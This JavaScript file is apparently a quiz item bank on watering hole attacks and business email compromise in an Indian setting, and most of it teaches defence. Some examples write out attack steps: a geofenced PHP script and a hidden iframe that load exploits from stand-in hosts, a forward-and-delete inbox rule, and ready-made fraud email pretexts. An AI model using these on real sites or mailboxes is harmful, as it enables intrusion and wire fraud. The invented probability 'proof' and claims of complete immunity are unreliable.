const questions = [
  {
    question: "What is a Watering Hole Attack (Strategic Web Compromise), and why is it named after wildlife predator behavior?",
    shortAnswer: "An attacker compromises a legitimate third-party website frequently visited by a specific targeted group, injecting exploits to infect visitors silently, just as a predator waits at a watering hole for prey.",
    explanation: "Rather than attacking a heavily defended corporate network directly, the adversary identifies websites that employees frequently visit (e.g. an industry trade forum, local power engineering portal in Kolkata, or medical association site). The attacker compromises the website and injects malicious JavaScript with selective IP filtering, delivering browser exploits only to visitors originating from the target enterprise's IP block.",
    hint: "A lion waiting at the riverbank to hunt zebras when they come to drink water.",
    level: "basic",
    codeExample: `// Watering Hole Exploitation Sequence:
// Step 1: Attacker identifies target visits "wb-power-engineers-forum.org"
// Step 2: Injects malicious JavaScript: if (is_ip_in_barrackpore_grid(client_ip)) { exploit_browser(); }
// Step 3: Substation engineer visits forum ➔ Silent drive-by browser compromise!`
  },
  {
    question: "What is Business Email Compromise (BEC) vs Email Account Compromise (EAC)?",
    shortAnswer: "BEC is the overarching social engineering fraud scheme designed to redirect wire transfers; EAC is the specific technical compromise of a legitimate corporate mailbox used to execute the fraud from the inside.",
    explanation: "In BEC, attackers manipulate employees into making unauthorized wire transfers (via spoofed headers or compromised accounts). EAC is the technical prerequisite where the attacker actually seizes control of the legitimate mailbox (via infostealer malware, credential stuffing, or AiTM phishing). With EAC, the attacker operates from within the authentic mailbox, making detection via SPF/DKIM impossible.",
    hint: "BEC is the robbery plan; EAC is stealing the house key so the thief can sit inside the living room to write the check.",
    level: "moderate",
    codeExample: `// BEC vs EAC:
// BEC (Fraud Scheme) : Tricking accounting into wiring ₹45 Lakhs to a fraudulent account.
// EAC (Technical)    : Compromising cfo@kolkata-fintech.in via stolen session cookie to send authentic emails.`
  },
  {
    question: "What are the 5 Standard BEC Scenarios according to the FBI Internet Crime Complaint Center (IC3) Taxonomy?",
    shortAnswer: "1. False Invoice Scheme / Supplier Swindle; 2. CEO Fraud / Executive Impersonation; 3. Account Compromise (EAC); 4. Attorney / Legal Impersonation; 5. Data Theft (Salary / W-2 Schemes).",
    explanation: "The 5 IC3 scenarios represent the global taxonomy of BEC: 1. Supplier Swindle: Altering bank details on vendor invoices; 2. CEO Fraud: Impersonating the CEO demanding urgent confidential wire transfers; 3. Account Compromise: Accessing internal accounts to request vendor payments; 4. Attorney Impersonation: Demanding urgent settlement of confidential legal disputes; 5. Data Theft: Extracting employee payroll/tax records for secondary fraud.",
    hint: "Invoices ➔ CEO ➔ Account Compromise ➔ Attorney ➔ Data Theft.",
    level: "basic",
    codeExample: `// The 5 Standard BEC Scenarios:
// 1. Supplier Swindle : "Please update our Axis Bank remittance account on Invoice #4920."
// 2. CEO Fraud        : "Wire ₹50 Lakhs before 4 PM for our confidential acquisition."
// 3. EAC Compromise   : Attacker logs into real CFO mailbox to issue payment approvals.
// 4. Attorney Pretext : "CONFIDENTIAL: Immediate escrow deposit needed for High Court stay."
// 5. Data Theft       : "Email all employee PAN cards and salary sheets for Q3 audit."`
  },
  {
    question: "How do Threat Actors use Hidden Inbox Forwarding & Delete Rules to maintain Persistence in Compromised Mailboxes (EAC)?",
    shortAnswer: "Attackers create automated inbox rules that silently forward incoming financial emails to an external attacker address and automatically delete or move replies to the 'RSS Feeds' or 'Deleted Items' folder.",
    explanation: "Once an attacker gains access to an Exchange Online mailbox in Kolkata, they configure a stealthy transport rule: `if Subject contains ('invoice' or 'wire' or 'payment') -> Forward to badactor@gmail.com AND DeleteMessage()`. When accounting replies to a payment inquiry, the legitimate user never sees the email in their Inbox, allowing the attacker to converse with the finance team unnoticed for weeks.",
    hint: "Setting up a trap door under the mailbox that catches all bank letters and drops them into a secret tunnel before the homeowner opens the door.",
    level: "expert",
    codeExample: `# PowerShell Script to Detect Malicious Exchange Inbox Rules:
Get-InboxRule -Mailbox "cfo@kolkata-fintech.in" | Where-Object {
    $_.ForwardTo -ne $null -or $_.DeleteMessage -eq $true -or $_.MoveToFolder -like "*RSS*"
} | Select-Object Name, ForwardTo, DeleteMessage, MoveToFolder`
  },
  {
    question: "How does Malicious OAuth App Consent (Illicit Consent Grants) provide Persistent BEC Access without Passwords?",
    shortAnswer: "The attacker tricks an employee into approving a malicious third-party Microsoft 365 app with `Mail.ReadWrite` and `Mail.Send` permissions, granting API access to the mailbox even if the user changes their password.",
    explanation: "Password resets do not revoke OAuth 2.0 application consent. In an Illicit Consent Grant attack, the victim receives a prompt: 'Grant permission to PDF Reader Pro'. The malicious OAuth app requests Microsoft Graph API permissions (`Mail.ReadWrite`, `Mail.Send`). Once granted, the attacker uses the OAuth refresh token to read, draft, and send emails via Graph API indefinitely without ever needing the user's password or MFA token again.",
    hint: "Giving someone a power of attorney stamp that lets them sign your checks forever, even if you change the lock on your front door.",
    level: "expert",
    codeExample: `// Malicious OAuth Consent Request:
// Application Name : "Corporate_PDF_Viewer_Update"
// Permissions      : Mail.ReadWrite, Mail.Send, User.Read (offline_access)
// Result           : Attacker accesses Graph API directly; persists through password resets!`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66D, what constitutes the criminal penalty for executing Business Email Compromise wire fraud?",
    shortAnswer: "Cheating by personating corporate officers or suppliers over computer networks to defraud entities carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66D explicitly covers BEC impersonation: 'Whoever, by means for any communication device or computer resource, cheats by personating, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66D penalizes Cheating by Personation with up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66D):
// Offense: Impersonating suppliers via BEC email schemes to divert corporate wire transfers
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,000`
  },
  {
    question: "How does Remote Browser Isolation (RBI) neutralize Watering Hole Attacks?",
    shortAnswer: "By rendering untrusted web pages inside disposable cloud containers and streaming only safe visual pixel streams (DOM or video) to the user's browser, preventing exploit execution on the local PC.",
    explanation: "In a Watering Hole attack, the compromised website delivers browser exploits (heap spraying, V8 zero-days). With Remote Browser Isolation (RBI), the user never connects directly to the compromised website. A disposable Linux container in the cloud executes the webpage and executes all JavaScript. The user's desktop receives only a sanitized pixel video feed. Zero zero-day exploits or malicious scripts can reach the local endpoint.",
    hint: "Looking at a tiger through bulletproof glass at the zoo—you can see everything, but the tiger cannot bite you.",
    level: "expert",
    codeExample: `// Remote Browser Isolation (RBI) Architecture:
// [User Browser in Kolkata] <--- (Sanitized WebRTC Video Stream) --- [Cloud RBI Linux Container]
//                                                                          |
// [Compromised Watering Hole Site] <--- (Direct Connection & Zero-Day Exploit detonates in Cloud Sandbox)`
  },
  {
    question: "What is Out-of-Band (OOB) Dual-Authorization, and why is it the Single Most Effective Control against BEC Supplier Swindles?",
    shortAnswer: "A policy requiring mandatory verbal telephone verification on a pre-registered master phone number before any banking details or wire transfer recipients can be updated.",
    explanation: "BEC succeeds because accounting staff trust email instructions. An Out-of-Band (OOB) Dual-Authorization policy establishes an inviolable rule: no wire transfer above ₹1,00,000 or change in vendor bank accounts may be processed based on email alone. The clerk must call the vendor's financial director on a verified, pre-established phone number (never the number in the email) to confirm the change.",
    hint: "Requiring two separate keys held by two different officers to open the missile silo.",
    level: "basic",
    codeExample: `// Out-of-Band Verification Policy Rule:
// if (Vendor.BankAccount.Changed == true || WireTransfer.Amount > 100000) {
//     Require_Secondary_Approver();
//     Enforce_Out_Of_Band_Voice_Verification(Vendor_Master_Phone_Registry);
// }`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if a BEC compromise leaks employee tax and banking records?",
    shortAnswer: "Failure to implement organizational security safeguards (dual-authorization protocols and OAuth app auditing) triggers statutory penalties up to ₹250 Crores by the DPBI.",
    explanation: "Section 8(5) mandates that data fiduciaries must implement reasonable security safeguards. If an enterprise in West Bengal suffers a BEC compromise that exposes 500,000 employee PAN cards, salary slips, and banking details, the DPBI can impose maximum statutory penalties up to ₹250 Crores under Section 33.",
    hint: "Failing to deploy BEC safeguards triggers maximum penalties under national data privacy law.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent organizational data protection`
  },
  {
    question: "How do Adversaries use Geofencing & IP Whitelisting in Watering Hole Attacks to evade Security Researchers?",
    shortAnswer: "The malicious script checks the visitor's IP address; if it matches the target enterprise's CIDR block in Kolkata, it delivers the zero-day exploit; otherwise, it returns normal website content.",
    explanation: "To prevent automated security crawlers and threat intelligence analysts from discovering the exploit, the watering hole server injects conditional logic: `if (visitor_ip in '103.25.10.0/24') { deliver_exploit(); } else { return clean_page(); }`. Because security researchers outside the target network receive clean pages, the watering hole remains active and undetected for months.",
    hint: "A secret club where the bouncer only opens the trap door for guests holding a specific local city library card.",
    level: "expert",
    codeExample: `// Watering Hole IP Filtering Script (PHP):
$client_ip = $_SERVER['REMOTE_ADDR'];
if (is_in_range($client_ip, "103.25.10.0/24")) {
    echo "<script src='https://c2.evil-host.in/v8_exploit.js'></script>"; // Target Infected!
} else {
    // Return standard benign page to external security researchers
}`
  },
  {
    question: "What is 'Attorney / Legal Impersonation' in High-Stakes BEC Attacks?",
    shortAnswer: "Attackers impersonate external legal counsel or senior attorneys, contacting finance staff with urgent demands for confidential escrow deposits to settle an impending lawsuit.",
    explanation: "Attorney impersonation exploits both authority and extreme confidentiality. The attacker emails the finance manager in Kolkata: 'I am Advocate Banerjee representing the company in a confidential High Court acquisition dispute. Per the Managing Director's directive, remit ₹65 Lakhs into the court escrow account immediately. Do not discuss this with anyone.' Fear of legal contempt suppresses normal verification.",
    hint: "A stranger dressed in a lawyer's black robes showing a forged court seal and demanding immediate bail money.",
    level: "moderate",
    codeExample: `// Attorney BEC Impersonation Header:
// From    : "Advocate S. Banerjee - Legal Counsel" <s.banerjee@kolkata-legal-associates.in>
// Subject : "STRICTLY CONFIDENTIAL: Immediate Escrow Remittance for High Court Settlement"
// Wire    : ₹65,00,000 to Axis Bank Escrow Account #984210`
  },
  {
    question: "How does Real-Time Graph API Activity Auditing detect Compromised Mailboxes in Microsoft 365?",
    shortAnswer: "By continuously monitoring Microsoft 365 audit logs (Unified Audit Log) for unusual OAuth application consent, new mailbox forwarding rules, and delegate permission changes.",
    explanation: "Microsoft Entra ID and Exchange Online log all administrative actions in the Unified Audit Log (`Search-UnifiedAuditLog`). Security Operations Centers (SOC) configure real-time SIEM alerts on operations: `New-InboxRule`, `Set-MailboxPermission`, and `ConsentToApplication`. When an unusual forwarding rule or OAuth consent grant is detected, SOAR automation revokes user session tokens within seconds.",
    hint: "A security camera in the bank vault that sounds an alarm whenever someone tries to photocopy the master ledger.",
    level: "expert",
    codeExample: `# PowerShell Command to Search Unified Audit Log for Malicious Inbox Rules:
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) \`
    -Operations "New-InboxRule", "Set-InboxRule", "ConsentToApplication" \`
    -ResultSize 100`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Business Email Compromise wire fraud incidents?",
    shortAnswer: "All organizations in India must report BEC compromises, unauthorized financial redirections, and rogue inbox forwarding rules to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of all BEC compromises within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Supplier Swindle' / False Invoice Fraud in Supply Chain BEC?",
    shortAnswer: "The attacker intercepts legitimate vendor communications and sends updated invoices requesting that payments be redirected to a new fraudulent bank account.",
    explanation: "Supplier Swindle accounts for over 60% of all BEC losses. Attackers monitor vendor email traffic to identify when an enterprise is expecting a large invoice (e.g. ₹75 Lakhs for substation hardware). The attacker intercepts the email, swaps the PDF invoice with an exact replica containing the attacker's bank account details, and emails: 'Please note our updated banking remittance account'.",
    hint: "Intercepting a delivery truck bill and stamping your own personal bank account number on the bottom before handing it to the cashier.",
    level: "basic",
    codeExample: `// Supplier Swindle Attack Flow:
// [Legitimate Vendor: "Invoice #9482 for ₹75 Lakhs Attached"]
// ➔ [Attacker intercepts & clones PDF invoice] ➔ [Alters Bank IFSC & Account Number]
// ➔ [Victim wires funds to attacker's mule account!]`
  },
  {
    question: "How do Passwordless FIDO2 WebAuthn Passkeys defeat Email Account Compromise (EAC)?",
    shortAnswer: "FIDO2 passkeys use cryptographic origin binding; phishing portals cannot steal passkey credentials or session tokens, preventing initial mailbox access.",
    explanation: "EAC relies on stealing corporate passwords and 2FA OTPs through phishing or infostealers. With FIDO2 WebAuthn: 1. Passwords and OTPs do not exist. 2. The hardware key performs asymmetric cryptography directly with the genuine domain. Even if a user visits a spoofed phishing portal, the passkey refuses to sign, preventing initial mailbox compromise and defeating EAC before it begins.",
    hint: "A physical key that only works when inserted into the exact genuine lock in your front door.",
    level: "moderate",
    codeExample: `// FIDO2 WebAuthn EAC Prevention:
// Phishing Link   : https://login.microsoft.evil-host.in
// WebAuthn Client : Origin mismatch! Private key refuses to sign challenge.
// Result          : Attacker obtains 0 passwords, 0 OTPs. EAC completely prevented!`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for unauthorized access achieved through Email Account Compromise (EAC)?",
    shortAnswer: "Liable to pay compensation by way of damages not exceeding ₹1 Crore to the affected entity for accessing corporate mailboxes without permission.",
    explanation: "Section 43(a) explicitly penalizes unauthorized access: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized system access.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Gaining unauthorized access to corporate email servers to manipulate wire transfers
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Payroll Diversion / Direct Deposit Phishing' in BEC Scams?",
    shortAnswer: "Attackers send emails posing as employees to HR or payroll departments, requesting to update their direct deposit bank account details to an attacker-controlled account right before payday.",
    explanation: "Direct Deposit Phishing targets HR departments. The attacker emails HR from a lookalike address: 'Hi Mahima, I recently switched my salary account to HDFC Bank. Please update my direct deposit details for this Friday's payroll: Account #948210'. HR updates the payroll profile without verbal confirmation, routing the employee's monthly salary to the attacker.",
    hint: "Telling the payroll clerk that your coworker wants their paycheck deposited into your personal bank account.",
    level: "moderate",
    codeExample: `// Payroll Diversion Pretext:
// From    : "Mamata (Lead Architect)" <mamata@kolkata-fintech-support.in>
// To      : "HR Payroll Desk" <payroll@kolkata-fintech.in>
// Body    : "Please update my direct deposit bank account for this month's salary to HDFC Bank #984210."`
  },
  {
    question: "Synthesize an enterprise-scale Watering Hole & Business Email Compromise (BEC) Defense Architecture.",
    shortAnswer: "A multi-layered system combining Remote Browser Isolation (RBI), Mandatory Out-of-Band (OOB) Dual-Authorization, FIDO2 Passwordless Passkeys, Graph API OAuth Consent Governance, and DMARC `p=reject` Enforcement.",
    explanation: "To achieve complete immunity against Watering Hole and BEC attacks: 1. Web Tier: Remote Browser Isolation (RBI) rendering untrusted third-party sites in isolated cloud containers. 2. Process Tier: Out-of-Band dual-authorization requiring voice confirmation on registered numbers for wire transfers > ₹1,00,000. 3. Identity Tier: FIDO2 WebAuthn passkeys immune to credential harvesting. 4. Application Tier: Graph API governance blocking unverified OAuth consent grants and auditing inbox forwarding rules. 5. Gateway Tier: DMARC `p=reject` enforcement.",
    hint: "Combine RBI cloud containers, out-of-band dual approvals, FIDO2 passkeys, OAuth governance, and DMARC p=reject.",
    level: "expert",
    codeExample: `// Master Watering Hole & BEC Defense Architecture Blueprint:
// 1. Web Armor Layer     : Remote Browser Isolation (RBI) for all untrusted industry forums
// 2. Identity Layer      : FIDO2 WebAuthn Passkeys (Eliminates EAC credential theft completely)
// 3. Process Armor Layer : Mandatory Out-of-Band voice verification for all bank detail alterations
// 4. API Governance Layer: Automated SOAR auditing of Exchange inbox forwarding rules & OAuth apps
// 5. Gateway Layer       : DMARC p=reject + Lookalike Domain DNS Sinkholing`
  },
  {
    question: "How do Attackers use 'Typo-Squatted Display Names' in Supplier Swindle BEC Schemes?",
    shortAnswer: "By registering external free email accounts with display names matching the vendor's financial officer, sending invoices from addresses like `vendor-billing-dept@gmail.com`.",
    explanation: "Small and medium enterprise vendors often communicate via webmail. Attackers register `vendor.name.billing@gmail.com` with the display name 'Vendor Accounting'. They email the buyer in Kolkata: 'Please find our updated invoice attached'. The buyer sees the vendor's company name in the display header and processes the payment without inspecting the domain.",
    hint: "Wearing a nametag with the delivery company's name while driving an unmarked personal car.",
    level: "moderate",
    codeExample: `// Display Name Supplier Swindle Header:
From: "Cisco Systems India Billing" <cisco-india-billing942@free-mailer.xyz>
Subject: Updated Q3 Gateway Hardware Invoice with New Axis Bank Remittance Account`
  },
  {
    question: "What is 'Drive-by Watering Hole Exploit Delivery' via Malicious Iframes?",
    shortAnswer: "Injecting hidden 1x1 pixel HTML iframes into compromised industry websites that silently redirect visiting browsers to an exploit kit landing page.",
    explanation: "When an attacker compromises a CMS (WordPress, Drupal) of an industry association site, they insert: `<iframe src='https://c2.evil-exploit.in/gate.php' width='1' height='1' style='display:none;'></iframe>`. When engineers in Barrackpore load the forum, the hidden iframe loads the exploit kit in the background, executing browser memory exploits without displaying any visual anomalies on the webpage.",
    hint: "Hiding a microscopic trapdoor on a public sidewalk that drops unsuspecting visitors into a hidden basement.",
    level: "expert",
    codeExample: `<!-- Hidden Watering Hole Iframe Injection -->
<div class="footer-widget">
  <iframe src="https://c2.evil-gateway.in/exploit_loader.php" width="0" height="0" style="display:none;visibility:hidden;"></iframe>
</div>`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for executing BEC financial fraud?",
    shortAnswer: "Dishonestly or fraudulently diverting corporate wire transfers via BEC carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer activity: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.' BEC wire fraud operations are prosecuted under Section 66.",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for BEC fraud.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Executing BEC fraud schemes to fraudulently divert corporate bank wire transfers
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'Vishing-Assisted BEC' (Multi-Channel BEC Fraud)?",
    shortAnswer: "The attacker sends a spoofed CEO email demanding an urgent wire transfer, followed immediately by a live vishing phone call using AI voice cloning to pressure accounting into processing it.",
    explanation: "Multi-channel attacks combine email and voice for maximum psychological impact. First, accounting receives an email: 'Mamata, wire ₹45 Lakhs to vendor immediately'. Two minutes later, the accounting clerk's phone rings: an AI voice clone of the CEO says: 'Did you get my email? Please process that transfer right now before the bank cutoff!'. The voice confirmation eliminates remaining doubt.",
    hint: "Sending a letter and then immediately calling on the phone to demand that the recipient open it.",
    level: "expert",
    codeExample: `// Multi-Channel Vishing-Assisted BEC:
// Step 1: Spoofed Email delivered: "Wire ₹45 Lakhs to legal escrow before 4 PM."
// Step 2: Inbound Phone Call: Real-time AI Voice Clone of CEO pressures clerk: "Did you send it yet?"`
  },
  {
    question: "How do Exchange Online Mailbox Transport Rules block Inbound External Emails with Executive Display Names?",
    shortAnswer: "By creating mail flow rules that inspect inbound external emails and quarantine messages where the Header From display name matches internal C-suite names.",
    explanation: "Microsoft Exchange transport rules scan message headers at the perimeter. A rule is configured: `if (Sender is External) AND (Header 'From' contains 'Mamata' or 'Managing Director') -> QuarantineMessage() AND NotifySOC()`. This ensures that even if an attacker creates a Gmail account named 'Mamata - Lead Architect', the email is blocked before reaching employees' inboxes.",
    hint: "A mailroom policy that automatically discards any incoming letter from outside the company that claims to be from the company president.",
    level: "moderate",
    codeExample: `# PowerShell Script to Create Executive Display Name Transport Rule:
New-TransportRule -Name "Block_External_Executive_Display_Spoofing" \`
    -FromScope NotInOrganization \`
    -HeaderMatchesMessageHeader "From" \`
    -HeaderMatchesPatterns "Mamata", "Managing Director", "Chief Financial Officer" \`
    -Quarantine $true`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating and Dishonestly Inducing Delivery of Property via BEC Wire Fraud?",
    shortAnswer: "Deceiving accounting staff through spoofed corporate communications to fraudulently induce them to transfer corporate funds or company assets, punishable with imprisonment up to 7 years.",
    explanation: "Section 420 IPC penalizes cheating: 'Whoever cheats and thereby dishonestly induces the person deceived to deliver any property... shall be punished with imprisonment of either description for a term which may extend to seven years, and shall also be liable to fine.' High-value BEC wire fraud cases are prosecuted under Section 420 alongside IT Act Section 66D.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Inducement for BEC wire fraud operations.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Deceiving accounting staff via spoofed executive emails to transfer ₹4.1 Crores
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Executive Calendar Reconnaissance' in Strategic BEC Timing?",
    shortAnswer: "Attackers compromise an executive's calendar to determine when they are on international flights or in board meetings, launching BEC wire requests when the executive cannot be reached by phone.",
    explanation: "Timing is critical in BEC. Attackers monitor the CEO's Outlook calendar: on Tuesday at 2:00 PM, the CEO is boarding an 8-hour flight to London with no phone connectivity. At 2:15 PM, the attacker sends the wire transfer request to accounting: 'I am on a flight to London, wire ₹50 Lakhs to the vendor immediately'. Accounting cannot reach the CEO by phone, increasing compliance probability.",
    hint: "Robbing the house the exact hour you know the owner is on an airplane.",
    level: "expert",
    codeExample: `// Calendar Reconnaissance & Attack Timing:
// Executive Calendar Entry : "Flight AI-111 (Kolkata to London) - 2:00 PM to 10:00 PM"
// Attacker Execution Time  : 2:15 PM ➔ Accounting cannot call CEO for voice verification!`
  },
  {
    question: "How do Cloud Access Security Brokers (CASB) block Malicious OAuth Consent Grants in Microsoft 365?",
    shortAnswer: "By continuously auditing third-party application permissions, assigning risk scores to OAuth apps, and automatically revoking grants with excessive privileges (e.g. `Mail.ReadWrite`).",
    explanation: "CASB solutions (e.g. Microsoft Defender for Cloud Apps) inspect all OAuth 2.0 application registrations. If an unknown, unverified third-party application requests high-risk Graph API permissions (`Mail.ReadWrite`, `Mail.Send`), the CASB automatically blocks user consent, alerts security administrators, and revokes OAuth tokens instantly.",
    hint: "A legal guard who reviews every contract before an employee signs it to ensure they don't give away the company's property.",
    level: "expert",
    codeExample: `// CASB OAuth Governance Policy:
// Trigger: Non-Verified Third-Party Application requests 'Mail.ReadWrite'
// Action : BLOCK CONSENT ➔ Revoke All Active Tokens ➔ Isolate User Session in SOC Dashboard`
  },
  {
    question: "What is 'Mule Account Money Laundering' in BEC Financial Exfiltration in India?",
    shortAnswer: "Using compromised, rented, or fabricated Indian bank accounts (mule accounts) to receive stolen wire transfers and rapidly disperse funds across hundreds of UPI accounts within minutes.",
    explanation: "Once an accounting clerk in Kolkata transfers ₹50 Lakhs, the funds land in an Indian bank mule account. Automated cybercrime networks immediately execute multi-hop transfers: splitting the ₹50 Lakhs into 200 smaller ₹25,000 transactions sent via IMPS and UPI to different accounts across India, followed by immediate ATM cash withdrawals within 30 minutes, preventing bank recall.",
    hint: "Splitting a stolen sack of gold coins into tiny handfuls and distributing them across 50 runners across the city.",
    level: "moderate",
    codeExample: `// BEC Mule Account Laundering Flow:
// [Victim Transfers ₹50 Lakhs] ➔ [Primary Mule Account]
// ➔ [Split into 200 x ₹25,000 UPI transfers in 5 minutes] ➔ [Immediate ATM Cash Out!]`
  },
  {
    question: "How does Bank 'Kill Switch' / Rapid Fund Recall (CFCFRMS / Citizen Financial Cyber Fraud Reporting) work in India?",
    shortAnswer: "Reporting wire fraud within the 'Golden Hour' (1-2 hours) on the National Cyber Crime Reporting Portal (Helpline 1930) enables banks to freeze funds in the recipient mule account before withdrawal.",
    explanation: "Under the Ministry of Home Affairs (MHA) Citizen Financial Cyber Fraud Reporting and Management System (CFCFRMS), when a company reports a fraudulent wire transfer on Helpline 1930 within the first hour, the nodal cyber police and destination banks issue automated API freeze holds, blocking withdrawals in the primary mule account and recovering up to 95% of stolen funds.",
    hint: "Calling the bank manager before the thief reaches the bank teller window to freeze the account.",
    level: "basic",
    codeExample: `// CFCFRMS Rapid Fund Recall SLA:
// Reported within 1 Hour  (Helpline 1930) ➔ Bank Freezes Mule Account (95% Fund Recovery!)
// Reported after 24 Hours (Helpline 1930) ➔ Funds Dispersed via UPI/ATM (0% Fund Recovery!)`
  },
  {
    question: "Synthesize the mathematical relationship between BEC Wire Transfer Value (A_amount), Executive Authority Factor (T_authority), Dual-Authorization Verification Strength (R_dual_auth), and BEC Wire Fraud Success Probability (P_bec).",
    shortAnswer: "BEC wire fraud success probability is modeled as P_bec = 1 - e^(- (A_amount * T_authority) / R_dual_auth); high authority drives P_bec to 1.0, but enforcing Out-of-Band Dual-Authorization (R_dual_auth = 1000) drives fraud probability to zero.",
    explanation: "Let $A_{\\text{amount}} \\ge 1.0$ represent the normalized financial transfer amount, $T_{\\text{authority}} \\ge 1.0$ represent the perceived authority multiplier (CEO / Board = 4.0), and $R_{\\text{dual\\_auth}}$ represent the dual-authorization verification strength (Out-of-Band voice calls on registered phone rosters, multi-party signoff). The BEC fraud success probability is: $P_{\\text{bec}} = 1 - e^{-\\frac{A_{\\text{amount}} \\times T_{\\text{authority}}}{R_{\\text{dual\\_auth}}}}$. When organizations enforce strict Out-of-Band Dual-Authorization ($R_{\\text{dual\\_auth}} \\to \\infty$), wire fraud success probability collapses to zero regardless of transfer amount or executive authority.",
    hint: "Mathematical formula proving that strict Out-of-Band Dual-Authorization (R_dual_auth -> infinity) drives BEC wire fraud probability to zero.",
    level: "expert",
    codeExample: `// BEC Wire Fraud Mathematical Proof:
// A_amount = 4.0 (₹4.1 Crore Transfer) | T_authority = 4.0 (CEO Authority Impersonation)
// Without Dual-Auth (R_dual_auth = 1.0) ➔ P_bec = 1 - e^(-16.0) = 100.0% (WIRE FRAUD COMPLETED!)
// With Out-of-Band Dual-Auth (R_dual_auth = 1000) ➔ P_bec = 1 - e^(-0.016) = 1.58% (FRAUD PREVENTED!)`
  }
];

export default questions;
